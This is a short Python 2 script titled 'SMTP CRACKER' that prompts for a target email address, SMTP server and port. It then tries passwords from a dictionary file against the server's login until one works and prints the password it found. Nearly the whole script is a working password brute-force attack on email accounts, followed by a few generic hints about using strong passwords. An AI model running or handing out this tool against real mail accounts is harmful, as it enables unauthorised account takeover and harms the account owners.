import smtplib, email, sys, time, os


print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#                 SMTP CRACKER                  #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"
hackerid =raw_input("\n[+]PLEASE ENTER EMAIL ID :")
smtpHost=raw_input("\n[+]PLEASE ENTER SMTP ADDRESS FOR SERVER (e.g. smtp.gmail.com):")
port =raw_input("\n[+]PLEASE ENTER PORT FOR CONNECTING TO SMTP SERVER :")
file= open("../../../dictonary.txt",'r')
for pas in file:
  password= pas.rstrip()
  print"\n[+]TRYING :",password
  try:
    server = smtplib.SMTP(smtpHost, port)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(hackerid, password)
    print"\n\n\n\n[+]PASSWORD FOUND :",password
    break
  except:
    pass

print"\n[+]DID I BREAK PASSWORD OF YOUR SMTP???"
o=raw_input("y or n : ")

if o=='y':
  print"\n[+]DO WANT SOME HINTS TO STOP THIS ATTACK ???"
  v=raw_input("y or n : ")
  if v=='y':
    print"\n[+]STEP 1.  USE STRONG PASSWORD"
    print"\n[+]STEP 2.  UPDATE YOUR SMTP SERVER"
    print"\n[+}STEP 3.  IF YOU ARE COMPLETLY UNKNOWN TO THIS STUFF...PLEASE EMAIL ME AT nisargjani20996@gmail.com OR CONSULT TO PENTESTERS / IT CONSULTERS"
  else:
    pass
else:
  pass
raw_input("\n[+]PLEASE ENTER ANY KEY TO EXIT ")
